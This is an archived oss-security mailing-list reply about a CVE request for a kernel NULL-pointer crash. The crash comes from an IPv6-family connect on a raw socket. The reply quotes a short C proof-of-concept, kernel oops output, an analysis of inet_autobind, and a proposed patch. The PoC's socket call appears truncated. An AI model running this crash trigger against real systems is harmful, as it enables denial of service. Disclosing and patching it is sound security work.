  oss-security - Re: CVE request - Android kernel - IPv6 connect cause  a denial of service            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [<thread-prev] [thread-next>] [day] [month] [year] [list]  Date: Wed, 9 Dec From: Robert Święcki <robert@...ecki.net> To: oss-security@...ts.openwall.com Subject: Re: CVE request - Android kernel - IPv6 connect cause  a denial of service  This also works under modern Linux kernels - and the SOCK_RAW socket can be created with namespaces.  $ ~/src/nsjail/nsjail -Mo --user 0 --group 0 --keep_caps --chroot / -- /bin/sh -i sh-4.3# /home/test/a  [  BUG: unable to handle kernel NULL pointer dereference at       (null) [  IP: [<          (null)>]           (null) [  PGD PUD PMD 0 [  Oops: [#2] SMP  Tested with:  $ uname -a Linux ABC SMP Fri Nov 6 UTC GNU/Linux   郭永刚 <guoyonggang@....cn>:  > > POC: > #include <linux/types.h> > #include <stdlib.h> > #include <stdio.h> > #include <sys/stat.h> > #include <fcntl.h> > #include <errno.h> > #include <pthread.h> > #include <sys/socket.h> > #include <sys/un.h> > #include <netinet/in.h> > int main(void){ > >          int socket_fd; >          struct sockaddr_in addr; >          addr.sin_port = 0; >          addr.sin_addr.s_addr = INADDR_ANY; >          addr.sin_family = 10; > >          socket_fd = >          connect(socket_fd , &addr,16); > >          return 0; > > } > > Analysis of causes: > In the file net/ipv4/af_inet.c , It will cause pc is 0x0  , if the > sk->sk_prot->get_port is NULL. > static int inet_autobind(struct sock *sk) > { >          struct inet_sock *inet; >          /* We may need to bind the socket. */ >          lock_sock(sk); >          inet = inet_sk(sk); >          if (!inet->inet_num) { >                    if (sk->sk_prot->get_port(sk, 0)) { >                             release_sock(sk); >                             return -EAGAIN; >                    } >                    inet->inet_sport = htons(inet->inet_num); >          } >          release_sock(sk); >          return 0; > } > > Solution: > >          Add check as follow: >                   if (sk->sk_prot->get_port &&sk->sk_prot->get_port(sk, > 0)) { >                             release_sock(sk); >                             return -EAGAIN; >                    } > >   --  Robert Święcki   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      